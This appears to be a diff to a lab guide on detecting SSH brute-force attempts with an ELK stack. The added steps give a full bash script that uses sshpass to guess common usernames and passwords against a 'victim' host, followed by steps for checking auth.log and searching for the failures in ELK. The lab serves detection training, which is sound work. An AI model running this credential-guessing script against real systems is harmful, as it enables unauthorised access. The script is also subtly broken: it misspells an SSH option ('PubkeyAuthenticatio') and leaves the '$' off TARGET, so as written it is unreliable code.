@@ -277,9 +277,52 @@ When all the commands have been executed, the agent will be installed . Repeat t
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/7cc293723bca5a679aff6b2b7bb9fe508998f7e0/Images/Detection-ELK/e38.png)
 
+Step 14.
 
+On the attacker's device, initiate a brute force attack using the script below
 
+```
+#!/bin/bash
 
+TARGET="ip address of victim's device"
+USER_LIST=("admin" "root" "user" "guest" "administrator")
+PASS_LIST=("123456" "password" "Pa$$w0rd" "admin123" "welcome" "qwerty")
 
+for i in {1..30}
+do
+  USER=${USER_LIST[$RANDOM % ${#USER_LIST[@]}]}
+  PASS=${PASS_LIST[$RANDOM % ${#PASS_LIST[@]}]}
 
+  echo "Attempt $i -> $USER $PASS"
+
+  sshpass -p "$PASS" ssh \
+  -o StrictHostKeyChecking=no \
+  -o PreferredAuthentications=password \
+  -o PubkeyAuthenticatio=no \
+  -o ConnectTimeout=3 \
+  $USER@TARGET exit 2>/dev/null
+
+  sleep 2
+done
+```
+NB: Install sshpass using the command 
+```
+apt install sshpass
+```
+
+Step 15
+
+On the victim's device, navigate to the auth.log file and examine. Failed login attempts will be recorded here. These attempts will be forwarded to ELK by the installed agent
+
+![image alt](https://github.com/Muts256/SNC-Public/blob/7cc293723bca5a679aff6b2b7bb9fe508998f7e0/Images/Detection-ELK/e40.png)
+
+Step 16
+
+On ELK, search for the failures
+
+![image alt](https://github.com/Muts256/SNC-Public/blob/7cc293723bca5a679aff6b2b7bb9fe508998f7e0/Images/Detection-ELK/e41.png)
+
+Select one  of the items found for further examination
+
+![image alt](https://github.com/Muts256/SNC-Public/blob/7cc293723bca5a679aff6b2b7bb9fe508998f7e0/Images/Detection-ELK/e42.png)
 
